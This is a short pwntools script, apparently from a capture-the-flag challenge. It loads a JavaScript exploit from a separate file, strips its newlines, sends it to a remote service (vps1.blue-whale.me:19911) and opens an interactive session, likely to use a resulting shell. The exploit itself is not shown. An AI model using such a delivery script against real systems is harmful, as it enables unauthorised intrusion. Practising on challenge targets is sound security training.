from pwn import *

f = open("exp.js")

payload = f.read().replace('\x0a','');
f.close()
f = open('af.js',"w");
f.write(payload);

p = remote("vps1.blue-whale.me", 19911)

p.sendline(payload);

p.interactive()